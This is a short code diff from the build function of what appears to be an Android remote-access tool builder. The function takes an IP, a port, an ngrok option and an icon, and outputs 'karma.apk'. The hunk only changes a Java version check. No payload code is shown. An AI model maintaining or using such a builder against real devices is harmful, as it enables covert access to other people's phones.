@@ -371,7 +371,7 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     java_version = execute("java -version")
     version_no = re.search(pattern, java_version.stderr).groups()[0]
     if java_version.stderr == "":print(stdOutput("error")+"Java Not Installed");exit()
-    if float(version_no) < 1.8: print(stdOutput("error")+"Java 8 is required ");exit()
+    if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
     print(stdOutput("info")+"\033[0mGenerating APK")
     outFileName = output if output else "karma.apk"
     que = queue.Queue()
